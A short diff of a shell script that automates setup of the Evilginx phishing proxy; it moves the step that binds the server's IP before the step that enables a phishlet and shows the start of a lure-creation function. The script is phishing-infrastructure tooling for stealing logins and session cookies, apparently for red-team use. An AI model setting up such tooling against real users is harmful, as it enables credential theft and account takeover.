@@ -21,16 +21,15 @@ setup_evilginx() {
     #sudo evilginx config domain "$subdomain"
     config domain "$domain_name"
     
+    # Bind to the IP address
+    #sudo evilginx config ip "$host_ip"
+    config ip "$host_ip"    
     # Enable the phishlet
     #sudo evilginx phishlets enable $default_phishlet
     if ! phishlets enable "$default_phishlet"; then
     echo "Failed to enable phishlet" >&2
     exit 1
     fi    
-
-    # Bind to the IP address
-    #sudo evilginx config ip "$host_ip"
-    config ip "$host_ip"
 }
 
 create_lure() {
